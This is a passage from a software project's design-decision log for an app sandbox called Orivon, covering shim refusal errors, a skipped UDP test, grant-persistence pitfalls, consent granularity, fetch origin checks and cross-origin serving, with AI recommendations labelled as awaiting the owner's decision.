**This is a solved problem one directory away.** PR #151 built exactly this machinery for the
`electron` compatibility package -- `src/shim-electron/unimplemented.ts`'s `refusingProxy` and
`unimplementedMember` -- under a title the owner accepted: *"Refuse unsupported electron APIs by
name and reason, not by absence"*. `grep -rn "unimplemented\|refusingProxy" src/shim/*.ts`
returns nothing, so the same reasoning has not been applied to the much larger Node surface.

*Still open.* Not fixed with the R8 dgram defects (PR for A136 below) because it is a
cross-cutting change to every module target in `src/shim/`, not a dgram bug, and because there
is a real design question underneath it: an ESM module namespace object cannot throw for an
undeclared name (#151's own finding), so `dns.resolve4` can only be made to refuse by name if
each module target exports a default whose value is a Proxy -- which changes how every
`module-map.ts` entry is consumed. That is an architectural choice, not a bug fix, so it is the
owner's.

> **Resolved 2026-09-14, `stream/shim-12-named-refusals`.** `refusingProxy` moved on the
> default-export of `node-dns.ts`, `node-fs.ts`, `node-http.ts`/`node-https.ts` and `node-net.ts`
> -- reused directly from `src/shim-electron/unimplemented.ts` rather than copied, after
> generalising it so `classify` returns the `Error` to throw directly instead of a record
> `shim-electron` converted via a hardcoded `refuse()` call. This package's own gaps get their
> own `OrivonShimError`/`ShimRefusalReason` (`src/shim/errors.ts`) rather than reusing
> `ElectronShimError` -- same shape, deliberately not the same reason union (code-guidelines.md
> Rule 3), matching this file's own three-way split ("unbuilt, refused by design, or a gap nobody
> noticed") plus a fourth this pass found concretely while doing the work: `'not-applicable'`,
> for a real Node member that exists only because of a runtime concept (an event-loop handle, a
> POSIX uid/gid) this environment has no equivalent for -- `fs.chmod`/`chown` are the example.
>
> **Before / after, measured, not asserted:** `dns.resolve4` read off the default export used to
> return `undefined` (then throw a bare `TypeError: dns.resolve4 is not a function` on the next
> line if called); it now throws `OrivonShimError { api: 'dns.resolve4', reason: 'not-built',
> message: "orivon-node-shim: dns.resolve4 is not supported -- ... (D-0006, ...)" }` the instant
> it is read. `fs.copyFile` the same way, reason `'unimplemented'`. Both proven in
> `src/shim/tests/node-dns.test.ts` and `node-fs.test.ts`.
>
> **`net.Socket`/`dgram.Socket` instances are deliberately NOT wrapped the same way** -- this
> pass's one real design finding, beyond applying #151's own mechanism. `refusingProxy` throws on
> *read*, and real Node libraries feature-detect these specific objects before calling them
> (`if (typeof socket.setBroadcast === 'function') ...`); a throw-on-read proxy would make that
> guard itself throw, turning an intended graceful skip into a crash -- a regression this fix
> would have caused. `class` prototypes are also non-writable, so the wrap is not mechanically
> available there the way it is for a plain exported object. Instead both classes gained the
> specific real methods a porting app is likely to hit as present functions, in the same
> "present, throws when called" shape `node-fs-unsupported.ts`/`node-http-unsupported.ts` already
> use for their own decided gaps: `ref()`/`unref()` are safe no-ops (real Node's own contract for
> them is "no meaning, return `this`", so a no-op is correct, not a shortcut), `setTimeout`
> (net.Socket) and `setBroadcast`/`setMulticastTTL`/`setMulticastLoopback`/`addMembership`/
> `dropMembership` (dgram.Socket) throw a named error when called. Full reasoning in
> `src/shim/README.md`'s Design notes.
>
> **Moving the mechanism to `src/shared/` was considered and rejected, AI-REC not an owner
> decision.** That directory is scoped to the `src/broker/` <-> `src/shim/` trust boundary
> specifically; `src/shim-electron/` sits on the same (renderer, no-broker-access) side of that
> boundary as `src/shim/`, so this is not the crossing it exists for. `src/shim/` now imports
> `src/shim-electron/unimplemented.ts` directly -- allowed by both packages' own "must never
> import" lists (`shim-electron`'s forbids only the reverse direction) but not something the
> owner was asked to confirm before this landed; flagging it here in case that call should be
> revisited.
>
> **Left out, on purpose, this pass:** whole missing modules with no shim target at all
> (`child_process`/`subprocess`, `hid`) stayed out of scope -- the task was the five module
> surfaces a porting developer actually lands on, not exhaustive coverage, and those two are
> Table 1's 🚫 rows rather than a shim gap. `'excluded'` is defined in `ShimRefusalReason` for
> that case but is not emitted by any classify function landed here.

### A136

**The flagship's UDP transport has no verification that executes anywhere.** Unattended build
queue item 5.1's exit criterion is *"A real torrent fetches from a non-WebRTC TCP peer and a DHT
lookup completes."* Exactly one test in the repository exercises the dgram shim against a real
caller -- `src/shim/tests/real-bittorrent-dht.test.ts`, driving a real unmodified
`bittorrent-dht` Client and a real `k-rpc-socket` -- and it is skipped in every checkout and in
CI. Its three cases are **the only three skipped tests in the whole 3741-test suite**.

The skip is structural, not incidental:
- the fixture it needs is `spike/app/node_modules/k-rpc-socket`
- `.gitignore:10` ignores `spike/app/node_modules`
- `.github/workflows/ci.yml` never installs it -- `grep -n "spike\|k-rpc"` finds only three
  comment lines, all about the unrelated Playwright attach issue

So the test cannot run in CI, and cannot run in a fresh clone. The suite is honest about the
skip -- there is a passing guard case that asserts *"is skipped: spike/app/node_modules/
k-rpc-socket is not present in this checkout"* -- but a green run still reads as "verified".

**Why this is filed rather than fixed.** The 2026-09-11 post-merge audit found three real
defects in `node-dgram-socket.ts` (a second `bind()` orphaning the first handle, the documented
array `send()` form throwing, `close()` emitting twice) that a real k-rpc-socket run would very
likely have surfaced. They survived a whole unattended build run AND a verified
`/claude-security` scan because the one test that exercises a real caller cannot execute. The
fix is a decision the owner owns, because each option costs something real:

1. **Vendor the fixture** -- commit `k-rpc-socket` (and `bencode`) under a tracked path. Makes
   the test run everywhere. Costs a vendored dependency in the tree, which Rule 8 and the
   supply-chain posture both have opinions about.
2. **Install it in CI** -- one `npm install` step scoped to `spike/app`. Cheap, but makes CI
   depend on the npm registry for a test the local developer still never runs.
3. **Accept it and say so louder** -- leave the skip, and make the compatibility matrix state
   plainly that the dgram row's real-caller evidence does not execute in CI.

*Still open. AI recommendation: option 2*, because it is the only one that turns a green CI run
into evidence about the flagship's transport without adding anything to the shipped tree. The
owner decides.

### A137

**Making a persisted grant visible in settings needs a DISPLAY-ONLY path, not startup
hydration.** C-01/C-02 are half-fixed: PR #158 persists each grant's origin, so the set of
origins that hold grants can now be enumerated (owner decision: shape (b), with the stored name
required to re-hash to the directory it was read from). What is still missing is the other half
-- the settings permissions list needs an app's NAME, and nothing persists a manifest, so the
list is still empty until an app happens to be opened.

The obvious completion was tried, built, tested, and then WITHDRAWN before merge: persist the
manifest in `registerApp`, and have `createBroker` call a `hydratePersisted()` that restores
every persisted origin's grants at startup. An adversarial review of that branch found three
defects and one design problem, all verified against the real code. They are recorded here
because the next attempt must not rediscover them.

**The design problem, and the reason the whole shape is wrong.** Startup hydration validates
restored grants against a manifest read off DISK, so both halves of the check come from the same
place. `decideGrantRequest` derives authority from `manifest.capabilities`
(`policy/request-grant.ts`), so an attacker who can write into the userData directory can create
a directory named `originHash(their-own-origin)` and place in it both a `grants.json` and a
`manifest.json` that agree with each other -- and hydration will make those grants live. The
re-hash check does NOT stop this: it prevents a file from claiming a DIFFERENT origin than its
directory, not an attacker from minting a consistent pair for an origin they choose. Before that
change, a planted `grants.json` was refused, because the manifest it was checked against was the
app's real, freshly fetched one. This is the discipline `policy/pin.ts` already states for itself
-- a value read off disk must not be trusted more than the same value arriving fresh -- and
startup hydration breaks it.

**What the list actually needs is narrower than what was built.** A settings page has to SHOW an
app and let a person REVOKE it. It does not need live grants. So the persisted manifest should be
read for DISPLAY ONLY (the app's name), the rows should be built from what is on disk, and
nothing should become live authority until the app is really opened and `registerApp` arrives
with its fetched manifest. That also means revocation for a not-yet-opened app cannot use a live
`GrantId` -- there is not one -- so it needs addressing by `(origin, capability)` instead. That
is the piece of new surface this needs, and it is why this is filed rather than finished.

**The three defects found in the withdrawn attempt**, each reproduced:

1. `hydratedCapabilities` was only ever added to. `GrantLedger.grant` replaces an entry in
   `grants` without clearing the flag, so a capability that had ever been disk-hydrated stayed
   flagged forever -- and the next `registerApp` re-validated a fresh, TRUSTED-SIDE grant against
   the manifest, deleting it if the app had since narrowed its declaration. That is precisely the
   A13 invariant `hydratedCapabilities` was introduced to protect, broken by the mechanism meant
   to protect it. Any future attempt must clear the flag in `grant()`.
2. **The A13 regression test cannot catch that.** `re-registering a manifest leaves existing
   grants untouched` (`broker/tests/index.test.ts`) builds its broker with
   `createBroker(baseDeps())` -- NO `ledgerStorage` -- so `hydratedCapabilities` is never
   populated and the faulty branch is structurally unreachable from it. The test passes whether
   or not the bug exists. A13 is currently unexercised under persistence, which is worth fixing
   on its own merits, independent of this item.
3. `readManifest` shape-checked only `name` and `version` and then cast to `Manifest`.
   `patternSetFromCapabilities` dereferences `capabilities.net?.tcp?.connect` -- guarded against a
   missing `net`, NOT against a missing `capabilities` -- so a `manifest.json` of
   `{"name":"x","version":"1.0.0"}` threw `TypeError` out of `hydratePersisted`, which
   `createBroker` calls unguarded during construction. A partial write or an unmigrated schema
   would have bricked startup permanently. Two lessons: a record read off disk must be validated
   as strictly as fresh input (the `isGrantsFileShape` discipline applied in the same PR, and not
   applied here), and one bad origin's record must never fail every other origin's hydration.

**A fourth item, latent, worth carrying:** `hydratePersisted` took its origin straight from
storage and used it as a `#origins` map key without passing it through `originFromUrl`.
`GrantLedger` canonicalizes nowhere internally and documents that `canonical()` in `index.ts`
does it for every entry point; that path was the first exception. Inert today only because the
re-hash check happens to imply canonicality, which stops being true the moment `originFromUrl`'s
rules are ever revised.

**And a requirement for build step 4, which nothing currently records.** Every capability call
gates purely on `ledger.currentGrant(...)` -- there is no separate check that `registerApp` ran
this session with a freshly fetched manifest. Whoever wires the app loader must call
`registerApp` with a fresh manifest before allowing any capability call, and must never read
`isRegisteredSync`/`registeredOriginsSync` returning true as evidence that a live check already
happened.

*Still open.* AI recommendation: the display-only path above. The owner already chose the input
to it -- save what was installed rather than re-fetching at launch (2026-09-11) -- and that
choice stands; what changes is that the saved manifest informs the LIST, never the authority.

## Build step 4 -- the app loader (2026-09-13)

### A138 -- may a person accept PART of what an app asks for? **[RESOLVED 2026-09-14 -- lane F-contracts]**

**Raised 2026-09-13**, opening build step 4, by owner decision `d-0025` (`ADR-0012`'s
2026-09-13 amendment): consent is asked once, before the app runs, for the whole set the
manifest declares.

What that amendment does not settle is whether the one dialog offers a **single choice** or a
**row per capability**. An app declaring network, filesystem and identity could plausibly be
allowed its network and refused its files.

**What is being built while this is parked: all-or-nothing.** Two reasons, both concrete rather
than preferential:

1. It is what the authority layer already expresses. `decideGrantRequest` narrows a request to
   what the manifest declares and answers allowed/not; the grant ledger stores one grant per
   `(origin, capability)`. A per-row choice needs no new mechanism, but it does need a new
   *decision* about what a partially-granted app is.
2. A partially-granted app hits precisely the failure `d-0025` exists to remove. An app whose
   filesystem call answers `'denied'` while its network works is, from its own code's point of
   view, a broken environment -- and because it was written against Node or against a browser,
   it will not have a graceful path for that. "Ask once so the app gets a decided answer" and
   "let the user answer three-quarters of the question" pull against each other.

**The counter-argument, stated so it is not lost:** all-or-nothing means a person who wants an
app but not its filesystem access has exactly one option, which is not to use it. That is a real
loss of user agency, and it is the kind of thing the permissions list (`A101`) exists to soften
-- revoke after the fact rather than refuse up front.

**Needed by:** Phase 4 item 4.2's owner checkpoint. Not blocking: the prompt is built
all-or-nothing, and turning it into a per-row choice later is a change to the dialog and to what
`requestGrant` is called with, not to the ledger or the policy beneath it.

> **Resolved 2026-09-14, lane `F-contracts` (owner decision).** The owner picked neither
> option this entry parked between -- not "always all-or-nothing" and not "always per-row" --
> but a third one nobody had put to them: *"A manifest can tell if the whole manifest is
> enforced, or the user is allowed for a more fine tuned control. This way ported shim apps
> will have no problem working, and Orivon-made apps will allow fine tuned permission
> control."*
>
> **The app declares which consent style it can survive, in its own manifest** --
> `Manifest.consentGranularity`, `'all-or-nothing'` or `'per-capability'`
> (`src/contracts/manifest.ts`'s `ConsentGranularity`, `docs/architecture/capability-api.md`
> §Manifest). A ported Node/Electron app, never written to handle a capability coming back
> refused, declares (or simply omits, see below) `'all-or-nothing'` and is never handed the
> mid-flight-denial failure this entry's point 2 named. An app written for Orivon from the
> start, whose author knows it checks `orivon.app.grants()` and degrades a missing capability
> on purpose, declares `'per-capability'` and its users get the real per-item control this
> entry's counter-argument asked for.
>
> **Default when the field is absent: `'all-or-nothing'`**, matching what this entry already
> had built. Every manifest written before this field existed was written with no idea a
> partial grant could ever happen -- exactly the ported-app case -- so silence has to read as
> the reading that can never hand an unprepared app a state its code has no path for.
>
> **One flag for the whole manifest, not one per capability.** The question it answers -- can
> the app's own code cope with an incomplete grant at all -- is a property of the app as a
> whole, not of any one capability: a ported app has no code path for a missing filesystem
> grant any more than for a missing network one. Read literally, the owner's own phrasing
> ("the whole manifest is enforced") already says this; no concrete case was found where a
> single app needs a different answer per capability.
>
> **What this resolves and what it leaves open.** This settles the *shape of the declaration*
> only -- a type on `Manifest`, contracts-only, no implementation. It does not itself build the
> per-row prompt UI, teach `decideGrantRequest` or the grant ledger to honor a partial accept,
> or wire `requestGrant` to pass a per-capability choice through -- that is real engineering
> against a real dialog, left for whichever build-step-4 lane picks up the install prompt.
>
> **Update 2026-09-14, lane `F-granular`.** That lane landed: `src/loader/manifest.ts` now
> parses `consentGranularity`, and `src/main/install-consent.ts`'s `requestInstallConsent`
> branches its staged Allow-all / Choose-individually / Deny-all dialog sequence on
> `manifest.consentGranularity === 'per-capability'`. `'per-capability'` in a manifest is no
> longer inert for install-time consent. See A162 for the implementation and for what still
> is not wired to it (the three update-time prompts).

### A139 -- asking at install brings back part of the prompt fatigue `ADR-0012` rejected **[AI-REC -- confirm at the 4.2 checkpoint]**

**Raised 2026-09-13**, same decision. `ADR-0012` rejected "ask before any fetch" partly because
a dialog raised by merely loading a page, disconnected from anything the user did, trains the
reflex to dismiss it. Asking once at install brings a version of that back: a first visit to a
hinted origin can now raise a dialog the user did not initiate.

**Three bounds are being implemented as requirements, not hopes** (they are also written into
`ADR-0012`'s amendment):

1. An origin whose manifest declares **no capabilities** is never asked about. It installs
   silently, and there is genuinely no question to put.
2. **Once per origin, ever** -- a grant lasts until revoked (`A101`), so a repeat visit is
   silent. Only a manifest that widens what it asks for returns, through `decideUpdate`'s
   existing re-consent path.
3. **One dialog for the whole declared set**, never one per capability. Three sequential dialogs
   for one app is the same fatigue at a finer grain.

**What would settle it:** the owner seeing the real dialog on a real first visit and saying
whether it reads as reasonable or as an interruption. That is exactly what item 4.2's checkpoint
is for, so this is filed as the thing to look at there rather than as an open design question.

**Needed by:** Phase 4 item 4.2's owner checkpoint.

### A141 -- `net.fetch`'s `Response.url` is the empty string on every ordinary fetch; `fetchBundle` cannot succeed against it as written **[RESOLVED 2026-09-13 — lane S4-A141-fetch-url]**

**Raised 2026-09-13**, lane S4-A59-probe, answering A59's own recommended measurement
(`spike/a59-response-url/`, throwaway, Electron 44.0.0, real launch confirmed via
`app.getVersion()`/`MessageChannelMain`). Full method and every measured case are in A59's
2026-09-13 update block, above — this entry is the actionable defect that measurement found,
not a duplicate of it.

`fetch-bundle.ts`'s same-origin and canonical-path checks (`fetchBundle`'s manifest and
asset-loop checks alike) read `response.url` as their sole source of truth for where fetched
bytes actually came from. Measured directly: `net.fetch`'s `Response.url` is `''` on every
ordinary, non-redirected, 200 OK response — not sometimes wrong, not wrong only for a narrow
input shape, unconditionally empty across 20 varied request shapes and both `http:`/`https:`,
using `electron-fetch.ts`'s own fetch options. `originFromUrl('')` is `null` (`new URL('')`
throws with no base, confirmed), so `manifestOrigin !== canonicalOrigin`
(`src/loader/fetch-bundle.ts`'s manifest check) is always true, and `fetchBundle` rejects every
manifest with "manifest was served from a different origin (invalid) than requested" before
ever reaching the asset loop — which has the identical shape and would reject the same way.

**Why this is not a security hole.** The check fails closed: nothing here lets a wrong origin's
bytes through, it simply refuses every origin's bytes, including a completely honest one. The
defect is availability, not confinement — but it is total: as written, `fetchBundle` cannot
ever return `ok: true` against a real `net.fetch` call, which is exactly the path PR #164's
discovery trigger is about to make reachable from live browsing.

**AI recommendation, not a decision, and not attempted here** (`src/loader/` is another lane's
paths): the same-origin and canonical-path checks do not need `response.url` at all. The URL
actually fetched is already known-safe at the call site — `ensurePublicUnicastOrigin` validated
the manifest URL's origin before `fetchBundle` ever calls `fetch(manifestUrl, ...)`, and
`resolveUrl(assetPath, canonicalOrigin)` is what built each asset URL in the first place.
`redirect: 'error'` (already shipped) is what makes trusting the REQUESTED url, rather than the
response's, safe against the one thing that could make them diverge: `net-client-request.ts`
hard-rejects the promise before a followed `Response` exists, so there is never a case where a
`net.fetch` call that returns an ok `Response` actually came from somewhere other than the URL
passed in. Whoever owns `src/loader/` should confirm that reasoning independently before relying
on it, and should also check whether `response.type` (measured `'default'`, always — also
confirmed wrong, per `electron.d.ts`) is depended on anywhere.

**Needed by:** before PR #164 (or any other path wiring `fetchBundle` to live, un-curated
content) merges — this is not a latent risk to plan around, it is a function that cannot
succeed today.

> **Fixed 2026-09-13, lane S4-A141-fetch-url.** Took the AI recommendation above after
> independently re-deriving it, rather than on authority: `fetch-bundle.ts`'s four `response.url`
> reads (manifest origin, manifest canonical path, asset origin, asset canonical path) now derive
> from the REQUESTED url (`manifestUrl`/`assetUrl`) instead. The checks themselves were kept, not
> deleted, even though the manifest pair is now provably tautological (`manifestUrl` is built by
> string concatenation two lines above) and the asset pair duplicates a pre-fetch check already
> present — both are documented as such in `fetch-bundle.ts` rather than silently left looking
> load-bearing. `electron-fetch.ts`'s `redirect: 'error'` was extracted into a separately exported
> `netFetch` function specifically so a test could exercise it without also having to pass
> `electronFetch`'s own loopback-refusing address guard, and `fetch-budget.ts`'s `Fetch` type now
> states as a REQUIREMENT (not only electron-fetch.ts's own choice) that any implementation must
> refuse to follow a redirect — fetch-bundle.ts's origin confinement rests entirely on that now,
> with no independent backstop left inside fetch-bundle.ts itself.
>
> **Three existing tests turned out to depend on the mechanism being removed** (all simulated a
> redirect via the test stub's `response.url` diverging from the request) and were replaced rather
> than patched: two "manifest served from a different origin/path" tests (one was passing for an
> unrelated reason once fixed, the other newly failing on a fixture gap that had never mattered
> before), the entry-leaf redirect test (ADR-0009 amendment #2 — now structurally unreachable
> through `fetchBundle`'s public API, since `entryPath` and the asset loop's own canonical path are
> the identical computation for the entry's own asset), and `bundleTree()`'s case-folding collision
> test (also unreachable through `fetchBundle` now — moved to a direct unit test in
> `bundle-hash.test.ts` so that check keeps real coverage). Full account in
> `src/loader/README.md`'s Design notes.
>
> **The larger half of this fix is the test infrastructure, not the four-line diff.** No test
> anywhere had ever exercised the real `electronFetch`/`net.fetch` adapter — every loader test
> injected a stub. `test/e2e-loader-adapter.test.ts` (with `test/loader-adapter-entry.ts`, a
> permanent probe bundled at test time with esbuild and launched as a bare Electron main process
> via the existing `launch-electron.mjs` harness) now drives the REAL adapter against a REAL local
> HTTP server inside a REAL Electron process: `electronFetch`'s address guard really refuses a
> real loopback attempt; `net.fetch`'s `response.url` really is `''` on an ordinary response
> (A59's finding, now a standing regression check); that real Response, fed through the real,
> unmodified `fetchWithBudget`, drains the correct bytes; and `redirect: 'error'` really produces
> a rejection against a real redirecting server — the load-bearing proof this fix depends on.
>
> **Not a full end-to-end `fetchBundle()` success test, and not by oversight.**
> `electronFetch`'s own address guard (T12/A46's no-loopback-carve-out) refuses every literal a
> local test server could ever use, so `electronFetch` cannot reach a real `net.fetch` call at all
> through this API without a genuinely public, routable HTTPS endpoint — which would make the test
> non-hermetic and is correctly out of scope (`docs/development/testing.md`). The redirect and
> content-draining proofs above call `netFetch` (electron-fetch.ts's own guard-free primitive,
> extracted for exactly this reason) directly instead, through the real `fetchWithBudget`.
>
> **Verified:** `npm run typecheck`, `npm test` (3789 passed, 3 skipped, unchanged from before this
> fix), `check:contracts`/`check:comments`/`check:size`/`check:natives`/`check:vectors`/
> `check:secrets` all pass. `npm run test:e2e` (full build, all 11 e2e files, 34 tests, including
> every pre-existing suite) green under `xvfb-run`, with zero surviving Electron/Xvfb processes
> and no leftover temp directories, confirmed via `/proc/<pid>/exe` resolution rather than a
> command-line match.
>
> **Left open:** esbuild is used directly from `node_modules` (already present transitively via
> `vite`) rather than declared in `package.json`, because this worktree's `node_modules` is a
> symlink into a tree shared with a live parallel-fleet run, and `npm install` against it mid-run
> is unsafe. A follow-up should decide whether to formally declare it as a devDependency.

---

### A142 -- the grant prompt shows a host, not a registrable domain, for lack of a public suffix list **[RESOLVED 2026-09-14 -- stream/shell-06-three-label-origin]**

**Raised 2026-09-13**, fixing A115 (subdomain-prefix confusable in the grant prompt).

A115's fix (`formatOriginForDisplay`, `src/main/grant-prompt-render.ts`) elides an overlong host
from the left by plain character count, so the label that decides authority always survives at
the visible end. That is the floor this lane could build with no new dependency. It is not the
same thing as showing the actual **registrable domain** (eTLD+1) -- the fact a person really
wants ("this is google.com" / "this is not google.com") -- which needs a public suffix list to
compute correctly. `example.co.uk`'s registrable domain is `example.co.uk`, not `co.uk`; a naive
"last two labels" guess gets this backwards, in the direction that hides the real registrant, so
it is worse than not computing it at all. This repo has no such dependency, and adding one is a
stop condition for the current run (`docs/planning/unattended-build-queue.md` stop condition 4:
license, provenance and pure-JS status reviewed by the owner first) -- so it is parked here
rather than added.

**Two candidates, checked against Rule 8 (pure-JS, no native modules) so the owner can decide
cheaply:**

- **`psl`** (`lupomontero/psl`) -- MIT license, latest `1.15.0`. One dependency, `punycode@^2.3.1`
  (also pure JS). Widely used (it is the PSL parser inside `request`/`superagent`'s cookie
  handling historically). Simpler API, slower per its own maintainer's benchmark against `tldts`.
- **`tldts`** (`remusao/tldts`) -- MIT license, latest `7.4.12`. One dependency, `tldts-core`
  (same author, same license, zero dependencies of its own). Used by several browser
  privacy/ad-blocking projects (its own comparison doc claims roughly 1000x `psl`'s throughput).
  Ships the suffix list baked into the package rather than fetched at runtime.

Both are pure JavaScript with no native bindings or install-time compilation, so `npm run
check:natives` should pass for either -- not run here, since neither is actually being added.
Whichever is preferred, the update would replace `formatOriginForDisplay`'s length-based elision
with rendering the registrable domain distinctly (e.g. bolded, or on its own line, ahead of the
rest of the host) -- an improvement on this fix's floor, not a correction of it: the length-based
elision remains correct (if blunter) even after a PSL is available, since it is the fallback for
whatever a chosen library cannot classify.

**Needed by:** whenever the owner is ready to review a new dependency; not blocking A115, whose
fix does not need one.

**RESOLVED 2026-09-14 (`stream/shell-06-three-label-origin`), by owner decision, without either
candidate dependency.** The owner replaced A115's character-count elision outright: always show
the host's last three dot-separated labels -- "the sub domain, the domain name, and the domain
name level 1 (the www, the google and the .com)" -- and the whole host at three or fewer.
**This closes the exact gap this entry names, by construction, with no suffix list to consult.**
`example.co.uk` is exactly three labels, so it renders whole; `www.example.co.uk` reduces to
`example.co.uk`, not to the `co.uk` a naive "last two labels" guess would have produced -- the
failure mode this entry was raised to avoid. Checked directly, not assumed: `.org.uk`, `.ac.uk`,
and Japan's `.co.jp`/`.or.jp`/similar two-label suffixes all get the same correct treatment,
because the rule only ever needs to know *how many* labels to keep, never *which* labels a
registry controls.

**Not a full close of "show the true registrable domain" in general -- a narrower, related gap
found while verifying the above and filed separately as A161, not folded in here.** Some Public
Suffix List *private*-section entries (cloud/PaaS platforms, not ccTLD registries) are themselves
three or four labels long -- confirmed live: `s3.amazonaws.com` is a fixed three-label suffix,
and `ap-northeast-1.compute.amazonaws.com` runs to four. A three-label count cannot follow a
suffix boundary that moves per platform; see A161 for what that means concretely and why a public
suffix list would not fully close it either. Two both/and dependency candidates were evaluated
(`psl`, `tldts`) and remain evaluated-but-unused; nothing here changes that assessment, since the
owner's fix needed neither.

### A140 — `app.requestGrant`'s own IPC timeout (120s) has no natural bound to derive it from **[AI-REC]**

**Raised 2026-09-13**, while wiring `app.requestGrant` onto `window.orivon` for the first time
(compatibility-matrix.md Table 4 row 1). `contracts/ipc.ts`'s rule 2 requires every control call
to carry an explicit `timeoutMs`, and every existing budget in `orivon-surface.ts`'s `TIMEOUT_MS`
table is sized against real I/O it bounds (a dial, a disk read). This call waits on a native
`dialog.showMessageBox`, i.e. a person, which has no such bound -- 120 seconds is a guess, not a
measurement.

**Consequence if the guess is wrong.** `handleControlRequest`'s `withTimeout` (`../broker/
transport/ipc.ts`) never cancels the underlying prompt when its own timer fires -- the doc
comment on that function is explicit that the broker call is left to settle on its own and its
result is discarded. So a person who takes longer than 120s to decide still produces a real
grant (or a real denial) once they click, but the page's own `requestGrant()` call already
resolved `'timeout'` and cannot see that outcome -- it would have to poll `app.grants()` to
notice. This is the same fail-by-silence shape every other timeout in this file already accepts;
what is new is that the wait this one bounds is a HUMAN decision, not I/O, so 120s trading off
against "how long is a normal person expected to take to read a prompt and click a button" is a
product judgement, not an engineering one.

**AI recommendation:** ship the 120s guess rather than block this PR on it -- the alternative
(no timeout at all) is not available under the existing contract, and a wrong guess degrades to
"the page has to poll," not to an incorrect grant. **Still open:** whether 120s is the right
number, and whether the page-visible failure mode (a `'timeout'` rejection racing an eventual
real answer) is acceptable at all, or whether `app.requestGrant` needs a way to observe the
prompt settling late -- e.g. a `app.grants()` change event -- instead.

### A143 -- a cross-origin request inside an app's own partition is denied, not proxied to the real network **[RESOLVED 2026-09-14 -- lane F-reach]**

**Raised 2026-09-13**, lane S4-3-serve, build step 4's serve-from-cache item
(`ADR-0007`'s other half: `src/loader/serve.ts`, `src/loader/electron-serve.ts`).

`session.fromPartition(...).protocol.handle('https', handler)` intercepts the WHOLE `https`
scheme for that session -- not merely requests addressed to the app's own host. Confirmed against
`electron/electron`'s own protocol registration code, and consistent with `spike/adr7-probe/`'s
own results (which never exercised a second host inside the probed partition). So a page running
inside its own app partition that fetches a THIRD-PARTY `https://` URL -- a font from a CDN, an
`<img src>` pointing elsewhere, anything not part of the pinned bundle -- reaches this SAME
handler, not the real network.

`serve.ts`'s handler answers that case by denying it (`originFromUrl(request.url) !== origin` ->
404), never proxying it through to Electron's real network stack. This is the fail-closed choice,
consistent with `ADR-0007`'s "a same-origin request whose path is not in the pinned set is denied,
not fetched" extended to the scheme-wide reality of how `protocol.handle` actually intercepts --
but it is a genuine behavioural choice ADR-0007's own text never resolves, because ADR-0007 was
written before `protocol.handle`'s per-scheme (not per-host) interception scope was confirmed
(A110, the 2026-09-10 probe).

**What this means in practice:** an Orivon app that references ANY resource outside its own
pinned, hashed bundle -- from its own partition, once serving is registered -- gets a silent
404 for that resource today, not a live fetch. `ADR-0005` already assumes a fully self-contained
bundle (everything the app needs is declared and hashed), so this may simply be correct and
permanent; it has not been decided as such.

**What would settle it:** an owner decision on whether an installed app may ever reference a
live, non-pinned, third-party resource from its own origin's partition, and if so, whether that
should be a full network passthrough (Electron's `net.fetch`, session-scoped, for any request
whose origin does not match the app's own) or a narrower allowlisted case. AI recommendation, not
an owner decision: leave it denied until a real app design needs otherwise -- broadening a fail-
closed default is reversible; the reverse is not.

**Needed by:** whichever future app actually needs an external resource from inside its own
partition -- not before, since nothing in this MVP's own fixture/flagship apps does today.

**Resolved 2026-09-14, owner decision: let apps reach third-party hosts they were granted.**
`src/loader/serve.ts`'s handler no longer denies a cross-origin request outright -- it now asks
`fetchThirdParty` (same file), which authorises the request against the app's LIVE `https.connect`
grant via `checkConnectSecure` (`src/broker/policy/connect-secure.js`) -- the SAME function
`orivon.net.connectSecure` itself calls, so this can never authorise a request that capability
would refuse -- and, if allowed, performs the real fetch via `src/loader/serve-reach.ts`'s
`nodeReachDial`, wired in by `src/loader/electron-serve.ts`.

**What stops this being an open proxy, stated explicitly rather than left implicit:** (1) only
requests already inside a SPECIFIC app's own partition ever reach this handler at all --
`ADR-0007`'s partition-scoped interception, unchanged; (2) every request is authorised against
THAT origin's LIVE, hydrated `https.connect` grant, read fresh per request, never anything cached
or read off disk (A137); (3) that grant is something a person actually approved (`ADR-0012`,
`A153`/`A156`/`A157`'s revalidation work); (4) no ambient credential ever flows -- `nodeReachDial`
uses Node's own `https` module, which has no cookie jar or session concept at all, a stronger
guarantee than Chromium's `credentials: 'omit'` because there is nothing to have forgotten to set;
(5) a redirect from the granted host is handed back as an ordinary 3xx `Response`, never followed,
so a granted host can never hand the request off to one nobody approved; (6) the response is
served as ordinary subresource content -- `script-src`/`connect-src` are untouched by this change,
so a hostile response body served through this path cannot execute as script.

**Only `https:` is proxied; `http:` stays denied, AI recommendation not an owner decision.**
`checkConnectSecure`'s trust model binds identity through the TLS handshake itself; a plain
connection has none, and `nodeReachDial`'s Node-`https`-based transport (chosen over Electron's
`net.fetch` specifically so this could be proven end to end over a real TLS handshake -- see
`serve-reach.ts`'s own header) has no way to pin a request to an address already checked while
keeping the real hostname for the connection, the same limitation `electron-fetch.ts`'s own A66
already names for a different caller. Authorising a plain request would therefore check one
address and could legitimately connect to another moments later (T12, DNS rebinding), for a
general, attacker-URL-reachable surface -- a materially different risk than A66's own narrow,
address-literal-constrained, install-time-only case. Filed as its own entry, A163, rather than
silently narrowed.

**CSP widened alongside the handler, from the SAME grant, not a second one.**
`img-src`/`font-src`/`media-src` now widen to the origin's `https.connect` grant
(`connect-src.ts`'s new `appReachCspHeaderValue`, reusing `connectSrcFor`'s own translation --
Rule 3) -- without this, `default-src 'self'`'s fallback would keep refusing the very
image/font/media loads this decision exists to allow, before a request could ever reach the
handler above. `connect-src` itself is untouched, still sourced from `tcp.connect` alone.

**A158 partially dissolved as a side effect -- see that entry's own resolution.** Before this
change, a too-narrow CSP header changed nothing observable, because the underlying request was
always denied regardless of what CSP said; this change made it concretely observable, and closed
it for `img-src`/`font-src`/`media-src` specifically -- but not for `connect-src`, for a reason
(`WebSocket` has no live re-check to fall back on) recorded in full on that entry, not repeated
here.

**A148's risk -- addressed directly in that entry**, since this is the change its own text named
as the trigger.

### A144 -- the loader's real-adapter e2e imports `esbuild`, which nothing declares **[AI-REC]**

**Raised 2026-09-13**, lane S4-A141-fetch-url, while building the first test that exercises the
REAL `electronFetch` rather than a stub (`test/e2e-loader-adapter.test.ts`).

That test bundles a small Electron main-process entry with `esbuild`, imported directly. **No
`package.json` entry declares it.** It resolves today only because `vite` pulls it in
transitively, so the import works and CI passes.

**Why this is filed rather than fixed.** Declaring it is a change to the dependency manifest,
